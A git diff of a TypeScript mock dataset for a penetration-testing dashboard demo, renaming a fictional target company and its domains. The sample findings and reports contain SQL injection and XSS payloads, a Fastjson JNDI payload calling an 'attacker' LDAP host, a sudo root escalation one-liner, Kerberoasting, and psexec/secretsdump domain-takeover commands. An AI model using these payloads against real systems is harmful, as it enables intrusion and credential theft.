@@ -1,6 +1,6 @@
 // Rich mock dataset for the Vercel demo (NEXT_PUBLIC_MOCK=1). Shapes track the
 // current backend contract in lib/api.ts + lib/types.ts. All data is static and
-// self-consistent (one company "Acme", a few tasks, findings, exploration graph,
+// self-consistent (one company "Northstar", a few tasks, findings, exploration graph,
 // sessions/activity, traffic, agents, etc.) so every page looks populated.
 
 import type {
@@ -48,15 +48,15 @@ import type {
 const T = (iso: string) => iso; // readability helper for timestamps
 
 // ── Tasks ──────────────────────────────────────────────────────────────────
-export const ACTIVE_TASK = "t-acme-web";
+export const ACTIVE_TASK = "t-northstar-web";
 
 export const tasks: Task[] = [
   {
-    id: "t-acme-web",
+    id: "t-northstar-web",
     category_id: 1,
     category_name: "外部评估",
-    description: "Acme 官网与后台外部渗透（acme.com）",
-    goal: "拿到 acme.com 后台管理权限，确认可读取用户敏感数据。",
+    description: "Northstar 官网与后台外部渗透（northstar.com）",
+    goal: "拿到 northstar.com 后台管理权限，确认可读取用户敏感数据。",
     status: "running",
     created_at: T("2026-07-24T09:12:00Z"),
     created_unix: 1785489120,
@@ -78,11 +78,11 @@ export const tasks: Task[] = [
     tokens: { input_tokens: 1284500, output_tokens: 96320, cache_read_tokens: 890400, cache_write_tokens: 132000 },
   },
   {
-    id: "t-acme-api",
+    id: "t-northstar-api",
     category_id: 2,
     category_name: "API 专项",
-    description: "api.acme.com 越权与注入测试",
-    goal: "评估 api.acme.com 订单/用户接口的越权(IDOR)与注入风险。",
+    description: "api.northstar.com 越权与注入测试",
+    goal: "评估 api.northstar.com 订单/用户接口的越权(IDOR)与注入风险。",
     status: "running",
     created_at: T("2026-07-25T14:05:00Z"),
     created_unix: 1785592500,
@@ -100,14 +100,14 @@ export const tasks: Task[] = [
     llm_profile_ids: [1, 2],
     active_llm_profile_id: 1,
     llm_failover_state: "ready",
-    source_task_ids: ["t-acme-web"],
+    source_task_ids: ["t-northstar-web"],
     tokens: { input_tokens: 642300, output_tokens: 51200, cache_read_tokens: 401000, cache_write_tokens: 60000 },
   },
   {
     id: "t-shop-pay",
     category_id: 2,
     category_name: "API 专项",
-    description: "shop.acme.com 支付与订单链路",
+    description: "shop.northstar.com 支付与订单链路",
     goal: "评估支付与订单接口的越权、金额篡改与竞态风险。",
     status: "paused",
     created_at: T("2026-07-22T08:30:00Z"),
@@ -125,7 +125,7 @@ export const tasks: Task[] = [
     llm_profile_ids: [2, 1],
     active_llm_profile_id: 2,
     llm_failover_state: "ready",
-    source_task_ids: ["t-acme-web", "t-acme-api"],
+    source_task_ids: ["t-northstar-web", "t-northstar-api"],
     tokens: { input_tokens: 233000, output_tokens: 18700, cache_read_tokens: 120000, cache_write_tokens: 22000 },
   },
   {
@@ -133,7 +133,7 @@ export const tasks: Task[] = [
     category_id: 1,
     category_name: "外部评估",
     description: "对外暴露面侦察（VPN / 边界服务）",
-    goal: "识别 acme.com 对外暴露的可利用边界服务。",
+    goal: "识别 northstar.com 对外暴露的可利用边界服务。",
     status: "done",
     created_at: T("2026-07-18T08:00:00Z"),
     created_unix: 1784966400,
@@ -241,11 +241,11 @@ export function stats(
 export const companies: Company[] = [
   {
     id: 1,
-    name: "Acme Corp",
+    name: "Northstar Corp",
     logo: "",
     asset_count: 18,
     scope: [
-      { id: 1, company_id: 1, kind: "domain", domain: "acme.com", raw: "acme.com", reason: "主域" },
+      { id: 1, company_id: 1, kind: "domain", domain: "northstar.com", raw: "northstar.com", reason: "主域" },
       { id: 2, company_id: 1, kind: "cidr", net: "203.0.113.0/24", raw: "203.0.113.0/24" },
       { id: 3, company_id: 1, kind: "ip", net: "198.51.100.20", raw: "198.51.100.20" },
     ],
@@ -258,8 +258,8 @@ export const assets: Asset[] = [
     type: "root_domain",
     company_id: 1,
     task_ids: [1],
-    domain: "acme.com",
-    root_domain: "acme.com",
+    domain: "northstar.com",
+    root_domain: "northstar.com",
     icp: "京ICP备2021xxxx号",
     record_type: "A",
     record_value: ["203.0.113.10"],
@@ -270,10 +270,10 @@ export const assets: Asset[] = [
     type: "subdomain",
     company_id: 1,
     task_ids: [1],
-    domain: "www.acme.com",
-    root_domain: "acme.com",
+    domain: "www.northstar.com",
+    root_domain: "northstar.com",
     record_type: "CNAME",
-    record_value: "acme.com",
+    record_value: "northstar.com",
     last_seen: T("2026-07-26T02:01:00Z"),
   },
   {
@@ -281,8 +281,8 @@ export const assets: Asset[] = [
     type: "subdomain",
     company_id: 1,
     task_ids: [2],
-    domain: "api.acme.com",
-    root_domain: "acme.com",
+    domain: "api.northstar.com",
+    root_domain: "northstar.com",
     record_type: "A",
     record_value: ["203.0.113.11"],
     last_seen: T("2026-07-26T02:02:00Z"),
@@ -292,8 +292,8 @@ export const assets: Asset[] = [
     type: "subdomain",
     company_id: 1,
     task_ids: [3],
-    domain: "shop.acme.com",
-    root_domain: "acme.com",
+    domain: "shop.northstar.com",
+    root_domain: "northstar.com",
     record_type: "A",
     record_value: ["203.0.113.12"],
     last_seen: T("2026-07-26T02:03:00Z"),
@@ -303,8 +303,8 @@ export const assets: Asset[] = [
     type: "subdomain",
     company_id: 1,
     task_ids: [4],
-    domain: "vpn.acme.com",
-    root_domain: "acme.com",
+    domain: "vpn.northstar.com",
+    root_domain: "northstar.com",
     record_type: "A",
     record_value: ["198.51.100.20"],
     last_seen: T("2026-07-20T02:00:00Z"),
@@ -314,8 +314,8 @@ export const assets: Asset[] = [
     type: "subdomain",
     company_id: 1,
     task_ids: [1],
-    domain: "admin.acme.com",
-    root_domain: "acme.com",
+    domain: "admin.northstar.com",
+    root_domain: "northstar.com",
     record_type: "A",
     record_value: ["203.0.113.10"],
     last_seen: T("2026-07-26T02:04:00Z"),
@@ -384,12 +384,12 @@ export const assets: Asset[] = [
     type: "app",
     company_id: 1,
     task_ids: [1],
-    url: "https://www.acme.com",
-    app_name: "Acme 官网",
+    url: "https://www.northstar.com",
+    app_name: "Northstar 官网",
     category: "corp",
     status_code: 200,
     content_length: 48213,
-    page_title: "Acme Corp — 企业官网",
+    page_title: "Northstar Corp — 企业官网",
     technologies: ["Nginx", "React", "Cloudflare"],
     favicon_mmh3: "-1580860059",
     last_seen: T("2026-07-26T02:08:00Z"),
@@ -399,12 +399,12 @@ export const assets: Asset[] = [
     type: "app",
     company_id: 1,
     task_ids: [1],
-    url: "https://admin.acme.com",
+    url: "https://admin.northstar.com",
     app_name: "后台管理",
     category: "admin",
     status_code: 200,
     content_length: 12044,
-    page_title: "Acme Admin 登录",
+    page_title: "Northstar Admin 登录",
     technologies: ["Nginx", "Vue", "Element-UI"],
     last_seen: T("2026-07-26T02:09:00Z"),
   },
@@ -413,7 +413,7 @@ export const assets: Asset[] = [
     type: "app",
     company_id: 1,
     task_ids: [2],
-    url: "https://api.acme.com",
+    url: "https://api.northstar.com",
     app_name: "REST API",
     category: "api",
     status_code: 401,
@@ -427,7 +427,7 @@ export const assets: Asset[] = [
     type: "endpoint",
     company_id: 1,
     task_ids: [2],
-    url: "https://api.acme.com/v1/orders",
+    url: "https://api.northstar.com/v1/orders",
     method: "GET",
     status_code: 200,
     params: [
@@ -441,7 +441,7 @@ export const assets: Asset[] = [
     type: "endpoint",
     company_id: 1,
     task_ids: [2],
-    url: "https://api.acme.com/v1/users/me",
+    url: "https://api.northstar.com/v1/users/me",
     method: "GET",
     status_code: 200,
     last_seen: T("2026-07-26T02:12:00Z"),
@@ -451,7 +451,7 @@ export const assets: Asset[] = [
     type: "endpoint",
     company_id: 1,
     task_ids: [1],
-    url: "https://admin.acme.com/login",
+    url: "https://admin.northstar.com/login",
     method: "POST",
     status_code: 200,
     params: [{ name: "username" }, { name: "password" }],
@@ -462,7 +462,7 @@ export const assets: Asset[] = [
     type: "endpoint",
     company_id: 1,
     task_ids: [1],
-    url: "https://www.acme.com/search",
+    url: "https://www.northstar.com/search",
     method: "GET",
     status_code: 200,
     params: [{ name: "q", in: "query" }],
@@ -592,12 +592,12 @@ export const findings: Finding[] = [
     severity: "high",
     status: "pending",
     report:
-      '## 漏洞概述\n\n`www.acme.com/search` 的 `q` 参数存在**报错型 SQL 注入**（MSSQL），可读取数据库版本、库结构乃至敏感数据。\n\n## 影响\n\n- 可读取 `acme_prod` 库的表结构与用户/订单数据\n- 报错回显便于快速构造利用，风险高\n\n## 复现步骤\n\n1. 触发报错注入：\n\n```\nGET /search?q=1\' AND 1=CONVERT(int,@@version)--\n```\n\n2. 响应回显 MSSQL 版本报错，确认可注入\n3. 进一步枚举库：`sqlmap -u "https://www.acme.com/search?q=1" --dbs`\n\n## 修复建议\n\n- 全部改用参数化查询/预编译语句，杜绝字符串拼接\n- 关闭生产环境详细报错回显\n- 数据库账号最小权限，禁用 `xp_cmdshell` 等危险扩展\n',
-    summary: "www.acme.com/search q 参数存在报错型 SQL 注入",
+      '## 漏洞概述\n\n`www.northstar.com/search` 的 `q` 参数存在**报错型 SQL 注入**（MSSQL），可读取数据库版本、库结构乃至敏感数据。\n\n## 影响\n\n- 可读取 `northstar_prod` 库的表结构与用户/订单数据\n- 报错回显便于快速构造利用，风险高\n\n## 复现步骤\n\n1. 触发报错注入：\n\n```\nGET /search?q=1\' AND 1=CONVERT(int,@@version)--\n```\n\n2. 响应回显 MSSQL 版本报错，确认可注入\n3. 进一步枚举库：`sqlmap -u "https://www.northstar.com/search?q=1" --dbs`\n\n## 修复建议\n\n- 全部改用参数化查询/预编译语句，杜绝字符串拼接\n- 关闭生产环境详细报错回显\n- 数据库账号最小权限，禁用 `xp_cmdshell` 等危险扩展\n',
+    summary: "www.northstar.com/search q 参数存在报错型 SQL 注入",
     evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → 返回 MSSQL 版本报错，可读库结构。",
     intent_id: "i-2",
-    task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_id: "t-northstar-web",
+    task_description: "Northstar 官网与后台外部渗透",
     ts: T("2026-07-26T01:20:00Z"),
   },
   {
@@ -606,11 +606,11 @@ export const findings: Finding[] = [
     vulnclass: "IDOR",
     severity: "high",
     status: "pending",
-    summary: "api.acme.com/v1/orders?id= 可越权读取他人订单",
+    summary: "api.northstar.com/v1/orders?id= 可越权读取他人订单",
     evidence: "将 id=1001 改为 id=1002 返回他人订单（含收货地址、手机号），无归属校验。",
     intent_id: "i-5",
-    task_id: "t-acme-api",
-    task_description: "api.acme.com 越权与注入测试",
+    task_id: "t-northstar-api",
+    task_description: "api.northstar.com 越权与注入测试",
     ts: T("2026-07-26T02:44:00Z"),
   },
   {
@@ -621,8 +621,8 @@ export const findings: Finding[] = [
     status: "pending",
     summary: "API JWT 使用弱密钥、可离线爆破伪造",
     evidence: "HS256，密钥 'secret'，john 5 秒破解 → 可伪造任意 sub 越权。",
-    task_id: "t-acme-api",
-    task_description: "api.acme.com 越权与注入测试",
+    task_id: "t-northstar-api",
+    task_description: "api.northstar.com 越权与注入测试",
     ts: T("2026-07-26T03:02:00Z"),
   },
   {
@@ -633,8 +633,8 @@ export const findings: Finding[] = [
     status: "pending",
     summary: "搜索页对 q 参数未转义，反射型 XSS",
     evidence: "q=<script>alert(document.domain)</script> 原样回显于结果标题。",
-    task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_id: "t-northstar-web",
+    task_description: "Northstar 官网与后台外部渗透",
     ts: T("2026-07-25T22:10:00Z"),
   },
   {
@@ -643,10 +643,10 @@ export const findings: Finding[] = [
     vulnclass: "Exposed .git",
     severity: "medium",
     status: "pending",
-    summary: "www.acme.com 暴露 .git 目录，可还原源码",
+    summary: "www.northstar.com 暴露 .git 目录，可还原源码",
     evidence: "GET /.git/HEAD → 200；git-dumper 还原出后端源码与数据库连接串注释。",
-    task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_id: "t-northstar-web",
+    task_description: "Northstar 官网与后台外部渗透",
     ts: T("2026-07-25T20:30:00Z"),
   },
   {
@@ -655,11 +655,11 @@ export const findings: Finding[] = [
     vulnclass: "Default Credentials",
     severity: "high",
     status: "pending",
-    summary: "admin.acme.com 后台默认口令 admin/admin123",
+    summary: "admin.northstar.com 后台默认口令 admin/admin123",
     evidence: "登录成功，进入管理后台，可管理用户与订单。",
     intent_id: "i-3",
-    task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_id: "t-northstar-web",
+    task_description: "Northstar 官网与后台外部渗透",
     ts: T("2026-07-26T03:50:00Z"),
   },
   {
@@ -670,8 +670,8 @@ export const findings: Finding[] = [
     status: "pending",
     summary: "登录后 next 参数任意跳转",
     evidence: "/login?next=https://evil.example 登录后 302 跳到外站。",
-    task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_id: "t-northstar-web",
+    task_description: "Northstar 官网与后台外部渗透",
     ts: T("2026-07-25T19:12:00Z"),
   },
   {
@@ -682,8 +682,8 @@ export const findings: Finding[] = [
     status: "pending",
     summary: "登录接口无速率限制，可暴力破解",
     evidence: "1000 次/分钟无锁定，无验证码。",
-    task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_id: "t-northstar-web",
+    task_description: "Northstar 官网与后台外部渗透",
     ts: T("2026-07-25T18:40:00Z"),
   },
   {
@@ -694,8 +694,8 @@ export const findings: Finding[] = [
     status: "pending",
     summary: "API 500 返回堆栈，泄露路径与框架版本",
     evidence: "触发 500 返回 Node.js 堆栈，泄露绝对路径与依赖版本。",
-    task_id: "t-acme-api",
-    task_description: "api.acme.com 越权与注入测试",
+    task_id: "t-northstar-api",
+    task_description: "api.northstar.com 越权与注入测试",
     ts: T("2026-07-25T23:05:00Z"),
   },
   {
@@ -707,7 +707,7 @@ export const findings: Finding[] = [
     summary: "shop 使用存在已知 RCE 的老版本组件",
     evidence: "指纹识别到组件 v2.3.1，对应 CVE-2024-xxxx 反序列化 RCE。",
     task_id: "t-shop-pay",
-    task_description: "shop.acme.com 支付与订单链路",
+    task_description: "shop.northstar.com 支付与订单链路",
     ts: T("2026-07-23T15:00:00Z"),
   },
   // ── 外网→内网纵深链路上的高危发现（active task）──
@@ -716,11 +716,11 @@ export const findings: Finding[] = [
     vulnclass: "Hardcoded Credentials",
     severity: "high",
     status: "pending",
-    summary: "泄露源码中硬编码数据库凭据 sa/Acme@2021",
-    evidence: "git-dumper 还原 www.acme.com/.git 得到 config.php，内含明文 DB 口令，后续被证实可在内网复用。",
+    summary: "泄露源码中硬编码数据库凭据 sa/Northstar@2021",
+    evidence: "git-dumper 还原 www.northstar.com/.git 得到 config.php，内含明文 DB 口令，后续被证实可在内网复用。",
     intent_id: "ig",
-    task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_id: "t-northstar-web",
+    task_description: "Northstar 官网与后台外部渗透",
     ts: T("2026-07-25T20:36:00Z"),
   },
   {
@@ -731,13 +731,13 @@ export const findings: Finding[] = [
     severity: "critical",
     status: "confirmed",
     report:
-      '## 漏洞概述\n\n`shop.acme.com` 的 `/api/import` 接口使用 **Fastjson 1.2.24** 解析用户可控 JSON，未开启 `safeMode`，可通过 `@type` 指定任意类触发 **JNDI 注入 → 远程命令执行**。\n\n## 影响\n\n- 攻击者无需认证即可在 DMZ Web 服务器上执行任意命令（`www-data@dmz-web01`）\n- 结合后续提权，成为进入内网的跳板\n\n## 复现步骤\n\n1. 构造 JNDI payload：\n\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n\n2. `POST /api/import`，`Content-Type: application/json`\n3. 目标回连 dnslog，落地反弹 shell\n\n## 修复建议\n\n- 升级 Fastjson 至 **1.2.83+** 并开启 `safeMode`\n- `/api/import` 增加鉴权与来源校验\n- 出网限制：禁止业务服务器主动外联 LDAP/RMI\n',
-    summary: "shop.acme.com Fastjson 1.2.24 反序列化远程命令执行",
+      '## 漏洞概述\n\n`shop.northstar.com` 的 `/api/import` 接口使用 **Fastjson 1.2.24** 解析用户可控 JSON，未开启 `safeMode`，可通过 `@type` 指定任意类触发 **JNDI 注入 → 远程命令执行**。\n\n## 影响\n\n- 攻击者无需认证即可在 DMZ Web 服务器上执行任意命令（`www-data@dmz-web01`）\n- 结合后续提权，成为进入内网的跳板\n\n## 复现步骤\n\n1. 构造 JNDI payload：\n\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n\n2. `POST /api/import`，`Content-Type: application/json`\n3. 目标回连 dnslog，落地反弹 shell\n\n## 修复建议\n\n- 升级 Fastjson 至 **1.2.83+** 并开启 `safeMode`\n- `/api/import` 增加鉴权与来源校验\n- 出网限制：禁止业务服务器主动外联 LDAP/RMI\n',
+    summary: "shop.northstar.com Fastjson 1.2.24 反序列化远程命令执行",
     evidence:
       "POST /api/import 提交 JNDI payload（@type:JdbcRowSetImpl）→ 回连 dnslog 并落地反弹 shell（www-data@dmz-web01）。",
     intent_id: "i7",
-    task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_id: "t-northstar-web",
+    task_description: "Northstar 官网与后台外部渗透",
     ts: T("2026-07-25T15:40:00Z"),
   },
   {
@@ -750,8 +750,8 @@ export const findings: Finding[] = [
     evidence:
       "sudo -l 显示 (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' 直接拿 root。",
     intent_id: "i8",
-    task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_id: "t-northstar-web",
+    task_description: "Northstar 官网与后台外部渗透",
     ts: T("2026-07-25T16:20:00Z"),
   },
   {
@@ -763,8 +763,8 @@ export const findings: Finding[] = [
     summary: "DMZ 主机双网卡直连内网，边界隔离失效",
     evidence: "dmz-web01 第二网卡在 10.10.10.0/24，可从 DMZ 直达域控/文件服务器/Jenkins，越过网络分区。",
     intent_id: "i9",
-    task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_id: "t-northstar-web",
+    task_description: "Northstar 官网与后台外部渗透",
     ts: T("2026-07-25T21:00:00Z"),
   },
   {
@@ -775,10 +775,10 @@ export const findings: Finding[] = [
     status: "pending",
     summary: "内部 Jenkins 未授权 Script Console 远程命令执行",
     evidence:
-      "GET /script 无需登录即可执行 Groovy：'whoami'.execute().text → SYSTEM；并从凭据库导出域账号 acme\\svc_deploy。",
+      "GET /script 无需登录即可执行 Groovy：'whoami'.execute().text → SYSTEM；并从凭据库导出域账号 northstar\\svc_deploy。",
     intent_id: "i11",
-    task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_id: "t-northstar-web",
+    task_description: "Northstar 官网与后台外部渗透",
     ts: T("2026-07-25T21:50:00Z"),
   },
   {
@@ -790,8 +790,8 @@ export const findings: Finding[] = [
     summary: "域服务账号 svc_sql 可被 Kerberoast 且口令弱",
     evidence: "GetUserSPNs 请求 svc_sql 的 TGS，hashcat -m 13100 离线破出 Sql@2020，该账号属于 SQL 管理组。",
     intent_id: "i12",
-    task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_id: "t-northstar-web",
+    task_description: "Northstar 官网与后台外部渗透",
     ts: T("2026-07-25T23:20:00Z"),
   },
   {
@@ -802,13 +802,13 @@ export const findings: Finding[] = [
     severity: "critical",
     status: "confirmed",
     report:
-      "## 漏洞概述\n\n经外网 Fastjson RCE 立足 DMZ，再由 sudo 提权、双网卡穿透、Jenkins 未授权 RCE 拿到域账号 `svc_deploy`；该账号属于 **Domain Admins**，最终完全控制域控 **DC01**。\n\n## 影响\n\n- 取得域管理员权限，可控制全域主机与账号\n- `secretsdump` 导出全域 NTLM 哈希（含 `krbtgt`），可制作黄金票据长期潜伏\n- 内部靶标达成\n\n## 复现步骤\n\n1. 以 `svc_deploy` 登录并导出哈希：\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. 获得 DC01 的 SYSTEM 权限，导出域内全部哈希\n\n## 修复建议\n\n- 收敛服务账号权限，移出 Domain Admins，落实分层管理（tiering）\n- 连续两次重置 `krbtgt`，轮换服务账号强口令\n- 修复 DMZ→内网边界隔离与前述 RCE/提权链\n",
+      "## 漏洞概述\n\n经外网 Fastjson RCE 立足 DMZ，再由 sudo 提权、双网卡穿透、Jenkins 未授权 RCE 拿到域账号 `svc_deploy`；该账号属于 **Domain Admins**，最终完全控制域控 **DC01**。\n\n## 影响\n\n- 取得域管理员权限，可控制全域主机与账号\n- `secretsdump` 导出全域 NTLM 哈希（含 `krbtgt`），可制作黄金票据长期潜伏\n- 内部靶标达成\n\n## 复现步骤\n\n1. 以 `svc_deploy` 登录并导出哈希：\n\n```\npsexec.py northstar/svc_deploy@10.10.10.10\nsecretsdump.py northstar/svc_deploy@10.10.10.10\n```\n\n2. 获得 DC01 的 SYSTEM 权限，导出域内全部哈希\n\n## 修复建议\n\n- 收敛服务账号权限，移出 Domain Admins，落实分层管理（tiering）\n- 连续两次重置 `krbtgt`，轮换服务账号强口令\n- 修复 DMZ→内网边界隔离与前述 RCE/提权链\n",
     summary: "拿下域控 DC01（Domain Admin）—— 内部靶标达成",
     evidence:
       "svc_deploy 属于 Domain Admins，psexec.py 以其登录 DC01 得 SYSTEM，secretsdump 导出全域 NTLM 哈希（含 krbtgt），完成靶标控制。",
     intent_id: "i13",
-    task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_id: "t-northstar-web",
+    task_description: "Northstar 官网与后台外部渗透",
     ts: T("2026-07-26T00:20:00Z"),
   },
 ];
@@ -824,7 +824,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "root",
       type: "fact",
-      payload: P({ summary: "根：acme.com 外网→内网纵深渗透" }),
+      payload: P({ summary: "根：northstar.com 外网→内网纵深渗透" }),
       priority: 0,
       state: "origin",
       origin: "system",
@@ -835,7 +835,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "g1",
       type: "goal",
-      payload: P({ text: "获取 acme.com 后台管理权限" }),
+      payload: P({ text: "获取 northstar.com 后台管理权限" }),
       priority: 9,
       state: "met",
       origin: "goals",
@@ -873,7 +873,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i1",
       type: "intent",
-      payload: P({ summary: "acme.com 子域枚举与端口扫描" }),
+      payload: P({ summary: "northstar.com 子域枚举与端口扫描" }),
       priority: 6,
       state: "done",
       origin: "planner",
@@ -900,7 +900,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i4",
       type: "intent",
-      payload: P({ summary: "www.acme.com/search 页 SQL 注入探测" }),
+      payload: P({ summary: "www.northstar.com/search 页 SQL 注入探测" }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -909,7 +909,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i5",
       type: "intent",
-      payload: P({ summary: "api.acme.com 订单接口越权(IDOR)测试" }),
+      payload: P({ summary: "api.northstar.com 订单接口越权(IDOR)测试" }),
       priority: 8,
       state: "running",
       origin: "planner",
@@ -918,7 +918,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "ig",
       type: "intent",
-      payload: P({ summary: "www.acme.com .git 源码泄露与硬编码凭据提取" }),
+      payload: P({ summary: "www.northstar.com .git 源码泄露与硬编码凭据提取" }),
       priority: 7,
       state: "done",
       origin: "planner",
@@ -929,7 +929,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i6",
       type: "intent",
-      payload: P({ summary: "shop.acme.com 组件指纹识别与 CVE 关联" }),
+      payload: P({ summary: "shop.northstar.com 组件指纹识别与 CVE 关联" }),
       priority: 7,
       state: "done",
       origin: "planner",
@@ -1005,7 +1005,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa1",
       type: "fact",
-      payload: P({ summary: "发现子域 admin.acme.com（Element-UI 后台）" }),
+      payload: P({ summary: "发现子域 admin.northstar.com（Element-UI 后台）" }),
       priority: 0,
       state: "open",
       origin: "work#1",
@@ -1032,7 +1032,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "faCreds",
       type: "fact",
-      payload: P({ summary: "源码 config.php 硬编码 DB 口令 sa / Acme@2021（疑似内网通用）" }),
+      payload: P({ summary: "源码 config.php 硬编码 DB 口令 sa / Northstar@2021（疑似内网通用）" }),
       priority: 0,
       state: "open",
       origin: "workG",
@@ -1095,7 +1095,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa9",
       type: "fact",
-      payload: P({ summary: "从 Jenkins 凭据库导出域账号 acme\\svc_deploy 明文口令" }),
+      payload: P({ summary: "从 Jenkins 凭据库导出域账号 northstar\\svc_deploy 明文口令" }),
       priority: 0,
       state: "open",
       origin: "work#11",
@@ -1124,7 +1124,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fi2",
       type: "finding",
-      payload: P({ summary: "SQL 注入（search q）可读 acme_prod 库" }),
+      payload: P({ summary: "SQL 注入（search q）可读 northstar_prod 库" }),
       priority: 0,
       state: "confirmed",
       origin: "work#4",
@@ -1142,7 +1142,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiSrc",
       type: "finding",
-      payload: P({ summary: "源码泄露 + 硬编码数据库凭据（sa/Acme@2021）" }),
+      payload: P({ summary: "源码泄露 + 硬编码数据库凭据（sa/Northstar@2021）" }),
       priority: 0,
       state: "confirmed",
       origin: "workG",
@@ -1305,7 +1305,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-24T09:12:25Z"),
     kind: "thinking",
     summary:
-      "graph_overview：goals 已由目标层拆好——g1「获取 acme.com 后台管理权限」、g2「读取用户敏感数据」，均 open；facts=0、recent_facts 为空（图基本空白，还没有任何 worker 产出）。范围内资产只有根域 acme.com + 一个 C 段。攻击面初判：www / admin / api / shop / vpn 五个入口。图里没有 fact，我只能做【极轻量只读探测】把初始意图说具体，绝不在 plan 里把活干了。",
+      "graph_overview：goals 已由目标层拆好——g1「获取 northstar.com 后台管理权限」、g2「读取用户敏感数据」，均 open；facts=0、recent_facts 为空（图基本空白，还没有任何 worker 产出）。范围内资产只有根域 northstar.com + 一个 C 段。攻击面初判：www / admin / api / shop / vpn 五个入口。图里没有 fact，我只能做【极轻量只读探测】把初始意图说具体，绝不在 plan 里把活干了。",
   },
   {
     seq: 1002,
@@ -1314,7 +1314,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "p0-probe",
-    summary: "curl -sI https://acme.com; curl -sI https://admin.acme.com",
+    summary: "curl -sI https://northstar.com; curl -sI https://admin.northstar.com",
     detail: "开局态势几乎空白，做 ≤3 次只读探测校准初始意图方向（不做枚举/验证，那是 worker 的活）。",
   },
   {
@@ -1325,7 +1325,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "p0-probe",
     summary:
-      "acme.com → 302 → www；Server: nginx/1.24.0\nadmin.acme.com → 200，X-Powered-By 缺省，body 命中 element-ui/vue 特征",
+      "northstar.com → 302 → www；Server: nginx/1.24.0\nadmin.northstar.com → 200，X-Powered-By 缺省，body 命中 element-ui/vue 特征",
     detail: "admin 是独立后台登录页；确认五入口有效，可把初始意图描述写精准。",
   },
   {
@@ -1337,7 +1337,7 @@ export const activity: Activity[] = [
     tool_use_id: "p0-ai",
     summary: "add_intent × 4（批量派首批探索方向）",
     detail:
-      "intents=[\n  { summary: 'acme.com 全量子域枚举 + 存活主机端口/服务识别，摸清攻击面', asset_ids: [acme.com], priority: 6 },\n  { summary: 'admin.acme.com 后台默认口令/弱口令测试（Element-UI 登录，无验证码）', asset_ids: [admin], priority: 9 },\n  { summary: 'www.acme.com/search q 参数 SQL 注入探测', asset_ids: [www], priority: 8 },\n  { summary: 'api.acme.com 订单接口越权(IDOR)测试', asset_ids: [api], priority: 8 },\n]\nparent_ids 均空（顶层全新方向，兜底连 origin fact）。",
+      "intents=[\n  { summary: 'northstar.com 全量子域枚举 + 存活主机端口/服务识别，摸清攻击面', asset_ids: [northstar.com], priority: 6 },\n  { summary: 'admin.northstar.com 后台默认口令/弱口令测试（Element-UI 登录，无验证码）', asset_ids: [admin], priority: 9 },\n  { summary: 'www.northstar.com/search q 参数 SQL 注入探测', asset_ids: [www], priority: 8 },\n  { summary: 'api.northstar.com 订单接口越权(IDOR)测试', asset_ids: [api], priority: 8 },\n]\nparent_ids 均空（顶层全新方向，兜底连 origin fact）。",
   },
   {
     seq: 1005,
@@ -1366,7 +1366,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T14:12:15Z"),
     kind: "thinking",
     summary:
-      "对照 recent_facts：workG 交回 faGit「.git 可下载，git-dumper 还原出后端源码」与 faCreds「config.php 硬编码 sa/Acme@2021（疑似内网通用）」；work#6 指纹交回 fa3「shop 命中 Fastjson 1.2.24（存在已知反序列化 RCE）」。两条【材料性新机理】：① 硬编码 DB 口令可能横跨内网复用；② Fastjson 有成熟 RCE 打法。这打开一条与现有认证/注入路线【本质不同】的入口——从 shop 直接 RCE 突破进 DMZ。先拉 faGit 详情核实产物。",
